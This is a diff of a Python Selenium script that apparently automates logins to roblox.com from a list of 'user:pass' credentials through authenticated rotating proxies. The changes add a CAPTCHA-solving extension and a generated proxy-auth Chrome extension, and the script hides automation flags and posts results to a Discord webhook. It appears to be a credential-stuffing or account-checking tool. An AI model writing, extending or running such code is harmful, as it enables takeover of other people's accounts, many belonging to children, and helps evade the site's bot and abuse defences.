@@ -1,12 +1,14 @@
+import os
 import json
 import random
+import zipfile
 import requests
 from multiprocessing import Process
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
-from selenium_authenticated_proxy import SeleniumAuthenticatedProxy
 
+cwd = os.getcwd()
 
 def formatProxy(proxy):
     if "@" in proxy:
@@ -26,10 +28,93 @@ def send_to_discord(content):
     response = requests.post(webhook_url, data=payload)
     return response
 
+def capsolver_api():
+    js_path = os.path.join(cwd, 'capsolver', 'assets', 'config.js')
+
+    cwd_json = os.path.join(cwd, 'config.json')
+
+    with open(cwd_json, 'r') as file:
+        config = json.load(file)
+        new_key = config['apiKey']
+
+    with open(js_path, 'r') as file:
+        filedata = file.read()
+
+    lines = filedata.split('\n')
+    for i, line in enumerate(lines):
+        if 'apiKey:' in line:
+            lines[i] = f'apiKey: "{new_key}",'
+
+    with open(js_path, 'w') as file:
+        file.write('\n'.join(lines))
+
+capsolver_api()
+
+extension_path = f'{cwd}//capsolver'
+
 def login(credentials, proxy):
     while True:
         try:
             co1, co2 = credentials.strip().split(":")
+            ip, port, username, password = proxy.split(":")
+
+            manifest_json = """
+            {
+                "version": "1.0.0",
+                "manifest_version": 2,
+                "name": "Chrome Proxy",
+                "permissions": [
+                    "proxy",
+                    "tabs",
+                    "unlimitedStorage",
+                    "storage",
+                    "<all_urls>",
+                    "webRequest",
+                    "webRequestBlocking"
+                ],
+                "background": {
+                    "scripts": ["background.js"]
+                },
+                "minimum_chrome_version":"22.0.0"
+            }
+            """
+
+            background_js = """
+            var config = {
+                    mode: "fixed_servers",
+                    rules: {
+                      singleProxy: {
+                        scheme: "http",
+                        host: "%s",
+                        port: parseInt(%s)
+                      },
+                      bypassList: ["localhost"]
+                    }
+                  };
+
+            chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
+
+            function callbackFn(details) {
+                return {
+                    authCredentials: {
+                        username: "%s",
+                        password: "%s"
+                    }
+                };
+            }
+
+            chrome.webRequest.onAuthRequired.addListener(
+                        callbackFn,
+                        {urls: ["<all_urls>"]},
+                        ['blocking']
+            );
+            """ % (ip, port, username, password)
+
+            pluginfile = 'proxy_auth_plugin.zip'
+
+            with zipfile.ZipFile(pluginfile, 'w') as zp:
+                zp.writestr("manifest.json", manifest_json)
+                zp.writestr("background.js", background_js)
 
             chrome_options = Options()
             chrome_options.headless = False
@@ -37,15 +122,11 @@ def login(credentials, proxy):
             chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
             chrome_options.add_experimental_option('useAutomationExtension', False)
             chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
+            chrome_options.add_argument(f'--load-extension={extension_path}')
+            chrome_options.add_extension(pluginfile)
 
-            formatted_proxy = formatProxy(proxy)
-            proxy_auth = ":".join(formatted_proxy.split("@")[0].split(":"))
-            proxy_ip_port = formatted_proxy.split("@")[1]
-
-            selenium_authenticated_proxy = SeleniumAuthenticatedProxy("http://" + proxy_auth + "@" + proxy_ip_port)
-            
-            selenium_authenticated_proxy.enrich_chrome_options(chrome_options)
             driver = webdriver.Chrome(options=chrome_options)
+
 
             driver.get("https://www.roblox.com/login")
 
